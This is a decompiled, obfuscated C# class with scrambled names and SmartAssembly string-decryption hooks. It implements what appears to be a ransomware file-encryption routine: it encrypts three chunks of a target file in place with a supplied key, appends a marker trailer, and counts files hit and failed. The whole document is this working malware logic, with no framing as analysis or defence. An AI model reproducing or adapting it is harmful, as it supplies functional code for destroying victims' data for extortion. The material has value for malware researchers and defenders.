using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using oFbodOYJTt;

namespace frgoWklvEOSV;

internal sealed class dsNajfALrLtCLf
{
	[NonSerialized]
	internal static GetString _0016;

	public static int sQtvooBwdOBCxEbJ(long P_0)
	{
		return (int)P_0;
	}

	public static bool PPfLKlDWqkz(string HZYgReqeZdwiOhP, string FggDlgbNzlN, string swyyhWDxghLYiaP, byte[] AJmlkCccFa = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(HZYgReqeZdwiOhP, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = sQtvooBwdOBCxEbJ(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(FggDlgbNzlN) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(FggDlgbNzlN) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(FggDlgbNzlN) * 1024 * 1024) / 10;
				}
				int num3 = 32;
				int qvcuhtejDQtivdh = (int)Math.Round((double)num2 / (double)num3, MidpointRounding.AwayFromZero) * num3;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] array2 = ykfZNBAtxOgnLFR(HZYgReqeZdwiOhP, fileStream, qvcuhtejDQtivdh, num * i);
					array = (PFruJiQrcriiZ.VGKELVlTFUV ? RpWKlAyYXuFg.pUQagweWpoRi(array2, Encoding.ASCII.GetBytes(swyyhWDxghLYiaP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fkozHCDTDrY.GVHcoGquozRzL(array2, Encoding.ASCII.GetBytes(swyyhWDxghLYiaP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					VQKAMVLwiHQGq(HZYgReqeZdwiOhP, fileStream, array, num * i);
				}
			}
			byte[] array3 = null;
			array3 = (PFruJiQrcriiZ.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(_0016(107399623)) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0016(107401288)) + Convert.ToString(FggDlgbNzlN) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0016(107401288))) : Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(_0016(107399623)) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0016(107401329)) + Convert.ToString(FggDlgbNzlN) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_0016(107401329))));
			if (!PFruJiQrcriiZ.IooTTsvIiwCN)
			{
				using FileStream fileStream2 = new FileStream(HZYgReqeZdwiOhP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array3, 0, array3.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(HZYgReqeZdwiOhP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(AJmlkCccFa, 0, AJmlkCccFa.Length);
				fileStream3.Write(array3, 0, array3.Length);
			}
		}
		catch (Exception ex)
		{
			if (PFruJiQrcriiZ.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(PFruJiQrcriiZ.jnRLNtXuRRg, _0016(107386581) + HZYgReqeZdwiOhP + _0016(107399642) + ex.Message + _0016(107396369));
				}
				catch (Exception)
				{
				}
			}
			PFruJiQrcriiZ.iePhSHBTqLd++;
			return false;
		}
		PFruJiQrcriiZ.XnicJWCgBOO++;
		return true;
	}

	public static byte[] ykfZNBAtxOgnLFR(string EjwSrAUzZvKj, FileStream tHqOIEIJiPQebk, int QvcuhtejDQtivdh, int UPTryFWELOOWJHJY = 0)
	{
		byte[] array = new byte[QvcuhtejDQtivdh];
		tHqOIEIJiPQebk.Position = UPTryFWELOOWJHJY;
		tHqOIEIJiPQebk.Read(array, 0, QvcuhtejDQtivdh);
		return array;
	}

	public static void VQKAMVLwiHQGq(string jctFitMebkeNhNmQ, FileStream JbNawZzPFxlR, byte[] yoyQQTyFZL, int VgSuiJKECvkU = 0)
	{
		JbNawZzPFxlR.Position = VgSuiJKECvkU;
		JbNawZzPFxlR.Write(yoyQQTyFZL, 0, yoyQQTyFZL.Length);
	}

	static dsNajfALrLtCLf()
	{
		Strings.CreateGetStringDelegate(typeof(dsNajfALrLtCLf));
	}
}
